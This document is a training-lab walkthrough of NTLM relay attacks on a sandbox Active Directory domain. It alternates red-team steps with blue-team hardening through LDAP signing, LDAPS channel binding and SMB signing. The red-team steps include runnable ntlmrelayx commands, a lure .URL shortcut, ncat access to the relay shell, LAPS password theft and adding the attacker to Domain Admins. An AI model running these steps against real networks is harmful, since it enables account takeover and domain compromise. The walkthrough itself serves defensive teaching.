
![[Pasted image 20231013161307.png]]

Protection - Enforce LDAP signing - Enforce LDAPs channel binding - Enforce SMB signing - Enforce HTTPs with Extended Protection - Disable NTLM on web services - Use the Protected Users group (for privileged account) - Block NTLM on system where it is not required (hard to achieve) - Disable NTLM v1



(ING) LAB 4 - Lateral movement

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 8 - Abuse NTLM authentication protocol [optional]

In this exercise **Miss Red** will attempt to perform an NTLM relay attack to impersonate Katrina's account against AD DS.

### Task 1 - Prepare the attack

Hello **Miss Red**. Let's start a fake HTTP service with the only objective to perform an NTLM relay attack against AD DS using LDAP.

1. Log on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and select **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal (Admin)** window, change the local directory `cd \Tools\Scripts`.
    
    We want to run the **ntlmrelayx.py** script to listen on a fake HTTP service and relay all connections to AD and open an LDAP interactive shell.
    
4. Execute the following command `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01`
    
    It starts to listen on connections on port 80. Leave that running.
    
    ❓ Why the --no-smb-server? **Click here to see the answer**.
    
    Now you are going to create a shortcut file to trick a user into clicking it… You will then place it on SRV01…
    
5. Right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click on **Run**.
    
6. In the **Run** window, type `notepad.exe` and **OK**.
    
7. In the **Untitled - Notepad** window, enter the following:
    
    ```
    [{000214A0-0000-0000-C000-000000000046}]
    Prop3=19,2
    [InternetShortcut]
    IDList=
    URL=http://cli01.contoso.com/
    IconIndex=234
    HotKey=0
    IconFile=C:\Windows\System32\SHELL32.DLL
    ```
    
8. Click on **File** then **Save**. Navigate to `C:\Users\Public`, in the **File name** field type `DO NOT CLICK.URL`and in the **Save as type** pick **All files (*,*)**. Click **Save**.
    
    ⚠️ Do not double click on the file you just created, that's intended to de clicked only by the victim.
    
9. Right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click on **Run**.
    
10. In the **Run** window, type `runas /user:connie.flores@contoso.com cmd.exe` and **OK**. When prompted, use the following password `NeverTrustAny1!`.
    
    > The password will not show in the prompt. Once you have clicked on the ![ntw2poa5.jpg](https://labondemand.blob.core.windows.net/content/lab127288/ntw2poa5.jpg) in front of the password, hit the Enter key to validate the input.
    
    This has open a new command prompt but as **Connie**.
    
11. In the new prompt called **cmd.exe (running as connie.flores@contoso.com)** run the following `copy "C:\Users\Public\DO NOT CLICK.URL" \\SRV01\C$`
    

Now we wait…

### Task 2 - Relay an authentication

In this task, you will start by playing the role of Katrina.

It is a beautiful day and Katrina has decided to do some administration work.

1. Log on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Open a new **File Explorer** window. In the address bar, type `\\SRV01\c$`. This is what you see: ![HU2.png](https://labondemand.blob.core.windows.net/content/lab127288/HU2.png)
    
    🤔 Hum… A file called DO NOT CLICK… What should you do.
    
3. Double click on **DO NOT CLICK**. And… Nothing happens… ![RELAY404.png](https://labondemand.blob.core.windows.net/content/lab127288/RELAY404.png) The page doesn't exist. So you continue your day…
    
    ❓ Wait… Why wasn't I even prompted? **Click here to see the answer**.
    
    Time for **Miss Red** to check what Katrina has really done.
    
4. Go back **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
5. In your **Windows Terminal (Admin)** window, you should see the following: ![NTLMRELAYs.png](https://labondemand.blob.core.windows.net/content/lab127288/NTLMRELAYs.png)
    
    You can see that the message indicates that an interactive shell was starting.
    
    📝 On what IP and which port the interactive shell has started?
    
6. Right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click on **Run**.
    
7. In the **Run** window, type `ncat 127.0.0.1 11000` and click **OK**.
    
8. In the **C:\Program File (x86)\Nmap\ncat.exe** window run `help` to get the list of commands. Then type `get_laps_password SRV01$`. Here you go, you have the password of the default local admin of SRV01. Let's play a joke on **Mister Blue** and add yourself to the **Domain Admins** group. Run the following: `add_user_to_group red "domain admins"`. Here you go, your own account is now a member of the domain admins group: ![DA.png](https://labondemand.blob.core.windows.net/content/lab127288/DA.png)
    
9. Close the **ncat** window.
    
10. In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution.
    

It's time to tell **Mister Blue** you owned another account and added yourself to domain admins.

### Task 3 - Enforce LDAP signing

Hello **Mister Blue**. Well, it seems that the attack was possible because of multiple factors:

1. The user clicked where she shouldn't have, maybe a bit of user training is a good idea
2. NTLM was enabled for an admin account
3. Signing was not enforce on the LDAP component of the domain controller

For 1, well go train your admins. For 2, we have seen some mitigation already. For 3, let's enforce LDAP signing.

1. Log on **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
    Let's start by removing **CONTOSO\red** from the **Domain Admins** group…
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` and click **OK**.
    
4. In the **Active Directory Users and Computers** console, right click on the domain name **contoso.com** and click **Find…**.
    
5. In the **Find Users, Contacts, and Groups** window, type `red` in teh **Name** field and click **Find Now**. In the results section, double click on the **Miss Red**, select the **Member Of** tab, select **Domain Admins** from the list of groups and click **Remove**, then **Yes** to confirm and then **OK** to close the **Miss Red Properties** window.
    
6. Close the **Find Users, Contacts, and Groups** window and then close the **Active Directory Users and Computers** console.
    
    Now let's enforce LDAP signing.
    
7. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
8. In the **Run** window, type `gpmc.msc` and click **OK**.
    
9. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.
    
10. In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server signing requirements**. Then click **Define this policy setting**, pick **Require signing** from the drop down menu, and click **OK**.
    
11. Close the **Group Policy Management Editor** window and then close the **Group Policy Management** window.
    
    ❓ Wait… That's it, why not do it all the time? **Click here to get some insights**.[](https://docs.microsoft.com/en-usHow%20to%20enable%20LDAP%20signing%20in%20Windows%20Server%20/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server)
    
12. Before putting it to the test, we need to refresh the group policy on the domain controller. Unlike regular servers which refresh policy every 90 minutes (+/- 30 minutes) domain controllers refresh their policies every 5 minutes. But eh, you're not patient so let's right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
13. In the **Run** window, type `gpupdate` and click **OK**.
    

Time for **Miss Red** to try again…

### Task 4 - Try again to relay Katrina's connection

Hi **Miss Red**, time to check if what **Mister Blue** did is blocking you or not…

1. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. In a **Windows Terminal (Admin)** window set in the following directory **C:\Tools\Scripts**, execute the following command `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01`
    
    Let's try Katrina again.
    
3. Go back on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
4. You should still have the **File Explorer** window open at the address **\SRV01\c$**. Double click on the **DO NOT CLICK** file. It should still be the following: ![RELAY404.png](https://labondemand.blob.core.windows.net/content/lab127288/RELAY404.png)
    
5. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
6. Look at the **Windows Terminal (Admin)** window. This time it failed: ![LDAPRF.png](https://labondemand.blob.core.windows.net/content/lab127288/LDAPRF.png)
    
    Well, let's try to do what the output is suggesting… Using LDAPS.
    
7. In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution. Then execute `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc01.contoso.com`
    
8. Go back on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
9. Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).
    
10. Then go back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. You see the NTLM relay attack worked just fine: ![LDAPRS.png](https://labondemand.blob.core.windows.net/content/lab127288/LDAPRS.png)
    
    Forcing signing in that case did not affect the connection made over TLS. Enforcing LDAP Signing is not enough. You also need to enforce what is called the Channel Binding Token for LDAPS connections.
    

### Task 5 - Enforce LDAPS channel binding token

This time you are going to do things on **DC02**. We will see why a bit later.

1. Log on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue` or `CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `gpmc.msc` and click **OK**.
    
4. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.
    
5. In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server channel binding token requirements**. Pick **Always** from the drop down menu, and click **OK**.
    
    > If you do not see this option, you might be connected to DC01 and not DC02. DC01 is missing security updates in your lab. Hence the option isn't there. That's why we do that on DC02. Note that the GPMC console can be pointing to DC01 that's fine. But the console has to be opened from DC02 in your lab.
    
6. Close the **Group Policy Management Editor** window.
    
    Like for LDAP Signing, the impact might be considerable on legacy applications and a thorough audit needs to be conducted before enabling this. But without this, look at how easy it was to workaround the signing requirement for LDAP with your NTLM relay attack…
    
    ❓ Why are we doing that on DC02? **Click here to see the answer**.
    

If you want to check if that protection worked, you can run the following from **CLI01**: `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc02.contoso.com` and try to connect with Katrina again.

```
📝 What is the error message?
```

### Task 6 - Try again to relay Katrina's connection

**Miss Red**, it looks like **Mister Blue** is not taking you seriously.

1. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution.
    
3. Then execute `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t smb://192.168.1.11 -smb2support --remove-mic`
    
    This time it is an NTLM relay to the SMB server of DC01, not LDAP. So this time if SMB Signing is not enforce on the server side, you'll get an easy access too 😎
    
4. Quickly stop by **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
5. Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).
    
6. Then go back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. And have a look at the terminal: ![SMBOWNED.png](https://labondemand.blob.core.windows.net/content/lab127288/SMBOWNED.png)
    
7. Right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click on **Run**.
    
8. In the **Run** window, type `ncat 127.0.0.1 11000` and click **OK**.
    
9. In the **C:\Program File (x86)\Nmap\ncat.exe** window run `shares`. This display all available share. Let's get into **C$**, run `use c$` then run `mkdir IWASTHERE`. Now list all the files and folders in the share with `ls`. You can see your new folder of the C drive of the DC: ![shellsmb.png](https://labondemand.blob.core.windows.net/content/lab127288/shellsmb.png)
    

How to block this one? Well simple. Like we enforced LDAP signing, **Mister Blue** will have to enable SMB signing.

### Task 7 - Enforce SMB Signing

**Mister Blue**, it seems that **Miss Red** is always one step ahead. You blocked relay attack on LDAP, but not on the SMB service (the file server service). And this time the scope of the risk is bigger. The LDAP service is available only on domain controllers. But the file server service, it might be on pretty much all machines. So, to stop the attack everywhere, let's enforce the SMB signing on all systems.

1. Log on **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
    Let's start by removing **CONTOSO\red** from the **Domain Admins** group…
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` and click **OK**.
    
4. In the **Active Directory Users and Computers** console, right click on the domain name **contoso.com** and click **Find…**.
    
5. In the **Find Users, Contacts, and Groups** window, type `red` in the **Name** field and click **Find Now**. In the results section, double click on the **Miss Red**, select the **Member Of** tab, select **Domain Admins** from the list of groups and click **Remove**, then **Yes** to confirm and then **OK** to close the **Miss Red Properties** window.
    
6. Close the **Find Users, Contacts, and Groups** window and then close the **Active Directory Users and Computers** console.
    
    Now let's enforce LDAP signing.
    
7. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
8. In the **Run** window, type `gpmc.msc` and click **OK**.
    
9. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.
    
10. In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Microsoft network server: Digitally sign communications (always)**. Then click **Define this policy setting**, select **Enabled** and click **OK**.
    
11. Close the **Group Policy Management Editor** window and the **Group Policy Management** console.
    

**⚠️ Can you break stuff doing that?**

**Absolutely!** But that's the price to pay to get rid of these relay attacks. And in 2022 (or whatever century you run this lab in), if your apps and appliances don't support SMB signing, you should really update them or get rid of them.

**BUT** it is super important to push for that configuration in you want to defeat NLTM relay attacks.

0% Tasks Complete

PreviousNext

Live Chat